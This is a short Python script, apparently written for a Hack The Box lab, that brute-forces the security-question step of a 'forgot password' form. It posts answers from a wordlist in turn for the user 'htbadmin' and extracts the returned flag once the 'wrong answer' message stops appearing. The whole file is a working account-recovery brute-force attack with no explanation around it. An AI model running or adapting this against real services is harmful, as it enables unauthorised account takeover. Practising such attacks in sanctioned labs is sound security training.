import requests 
import re 

with open("./payloads/boxes.txt", "r") as f:
	boxes = f.readlines()

url = "http://139.59.176.158:30000/forgot.php"
session = requests.Session()
invalid_text = "Sorry, wrong answer"

for box in boxes:
	box = box.rstrip()
	
	data = {
		"question": "Which is your favourite HTB box?",
		"userid": "htbadmin",
		"answer": box,
		"submit": "answer"
	}

	r = session.post(url, data=data)
	if invalid_text in r.text:
		print(f"Testing - {box}")
	if not invalid_text in r.text:
		answer = re.findall(r'Your flag is (.*)</strong>', r.text)[0]
		print("=====================")
		print(f"[!] {answer}")
		print("=====================")
		print(r.text)
		break
